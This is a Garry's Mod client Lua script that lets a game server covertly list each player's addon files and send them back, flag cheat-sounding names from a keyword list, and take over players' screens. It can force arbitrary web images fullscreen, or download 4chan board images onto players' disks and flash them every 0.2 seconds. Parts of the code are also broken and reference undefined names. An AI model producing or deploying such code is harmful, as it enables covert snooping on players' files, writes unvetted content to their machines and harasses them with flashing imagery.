
-- cl_ronnie.lua #NoSimplerr#
-- named after someone special

net.Receive("RonnieGreeting", function(len)
	local GmodFiles, GmodFolders = file.Find('addons/*', 'GAME') 

	net.Start("RonnieGreeting")
		net.WriteTable(GmodFiles)
		net.WriteTable(GmodFolders)
	net.SendToServer()
end)

local ScaryWords = {
	"hack",
	"aim",
	"bot",
	"cheat",
	"radar",
	"crosshair",
	"bypass",
	"wall",
	"esp",
	"script",
	"lenny",
	"trigger",
	"crosshair",
	"steal",
	"bhop",
	"bunnyhop",
	"auto",
	"spam",
	"mark",
	"cham",
	"anti",
	"detector",
	"radar",
	"srs",
	"cslua"
}

local color_ok = Color(255, 255, 0, 255)
local color_bad = Color(255, 0, 0, 255)
local color_fill = Color(255, 255, 255, 255)

local PlayerFiles = {}

net.Receive("YayRonnieGreetedMe", function(len)
	local Victim = net.ReadEntity()
	local GMAs = net.ReadTable()
	local Folders = net.ReadTable()
	local sid = Victim:SteamID()
	PlayerFiles[sid] = {id = sid, gma = GMAs, fol = Folders}
end)

concommand.Add("ronnie_listfiles", function(ply, cmd, args)
	if not IsValid(ply) or not ply:IsAdmin() then return end
	print("people we have files for:")
	for k, v in pairs(PlayerFiles) do
		print(k)
	end
	print("that's it!")
end)

concommand.Add("ronnie_getfiles", function(ply, cmd, args)
	if not IsValid(ply) or not ply:IsAdmin() then return end
	if not args[1] then print("Invalid arguments!") return end
	local sid = args[1]
	local ply = player.GetBySteamID(sid)
	if not IsValid(ply) or not ply:IsPlayer() then
		ply = sid
	end
	PrintOutFiles(ply, gPlayerFiles[sid].gma, gPlayerFiles[sid].fol)
end)

local function PrintOutFiles(Victim, GMAs, Folders)
	MsgC(color_fill, "--------------------------------------"); MsgN("")
	MsgC(color_fill, isstring(Victim) and Victim or Victim:Nick() .. "'s Addon's Folder"); MsgN("")
	MsgC(color_fill, "--------------------------------------"); MsgN("")
	MsgC(color_fill, "-----------------GMA------------------"); MsgN("")
	MsgC(color_fill, "--------------------------------------"); MsgN("")

	for k, filename in pairs(GMAs) do
		local PrintColor = color_ok
		for l,scary in pairs(ScaryWords) do
			if string.find(string.lower(filename),scary) then
				PrintColor = color_bad
			end
		end
		MsgC(PrintColor, filename);MsgN("")
	end

	MsgC(color_fill, "--------------------------------------"); MsgN("")
	MsgC(color_fill, "----------------FOLDERS---------------"); MsgN("")
	MsgC(color_fill, "--------------------------------------"); MsgN("")

	for k, filename in pairs(Folders) do
		local PrintColor = color_ok
		for l,scary in pairs(ScaryWords) do
			if string.find(string.lower(filename), scary) then
				PrintColor = color_bad
			end
		end
		MsgC(PrintColor, filename); MsgN("")
	end
end

local ronnie_texture = false

net.Receive("RonnieWantsYouToSeeSomething", function(len)
	local image = net.ReadString()
	if not image then return end
	if image == "-snip-" then
		ronnie_texture = false
		return
	end

	-- slight built-in delay so we dont show an
	-- error texture while we fetch the real one
	MaterialURL(image)
	timer.Simple(1, function()
		ronnie_texture = image
	end)
end)

local blank = Color(255, 255, 255, 255)

hook.Add("PostRenderVGUI", "RonnieImage", function()
	if not ronnie_texture then return end
	surface.SetDrawColor(blank)
	surface.SetMaterial(MaterialURL(ronnie_texture))
	surface.DrawTexturedRect(0, 0, ScrW(), ScrH())
end)

net.Receive("RonniePrepare4Chan", function(len)
	local board = string.lower(net.ReadString())
	file.CreateDir("4chan_" .. board)
	http.Fetch("https://boards.4chan.org/" .. board .. "/catalog", function(body, len, headers, code)
		local threads = string.Split(body,"\"imgurl\":\"")
		table.remove(threads, 1) -- first is always no good
		local image_urls = {}
		for k, v in pairs(threads) do
			local id = string.Left(v, 13)
			image_urls[k] = "https://i.4cdn.org/" .. board .. "/" .. id .. ".jpg"
			http.Fetch(image_urls[k], function(jpg_data)
				-- if its not a jpg, its probably png
				if string.find(jpg_data, "404") then
					image_urls[k] = "https://i.4cdn.org/" .. board .. "/" .. id .. ".png"
					http.Fetch(image_urls[k], function(png_data)
						-- it could still be gif, which we cant use
						if string.find(png_data, "404") then
							image_urls[k] = nil
						else
							file.Write("4chan_" .. board .. "/" .. id .. ".png", png_data)
						end
					end)
				else
					file.Write("4chan_" .. board .. "/" .. id .. ".jpg", jpg_data)
				end
			end)
		end
	end)
end)

local texture_4chan = false

net.Receive("RonnieExplode4Chan", function(len)
	local board = net.ReadString()
	if not board then return end
	if board == "-snip-" then
		if timer.Exists("RonnieExplode4Chan") then
			timer.Remove("RonnieExplode4Chan")
		end
		texture_4chan = false
		return
	end

	local i = 1
	local mats_4chan = {}
	local files = file.Find("4chan_" .. board .. "/*", "DATA")
	if not files then return end
	timer.Simple(2, function()
		timer.Create("RonnieExplode4Chan", 0.2, 0, function()
			mats_4chan[i] = mats_4chan[i] or Material("data/4chan_" .. board .. "/" .. files[i])
			texture_4chan = mats_4chan[i]
			i = i + 1
			if i > #files then
				i = 1
			end
		end)
	end)
end)

hook.Add("PostRenderVGUI", "Ronnie4Chan", function()
	if not texture_4chan then return end
	surface.SetDrawColor(blank)
	surface.SetMaterial(texture_4chan)
	surface.DrawTexturedRect(0, 0, ScrW(), ScrH())
end)
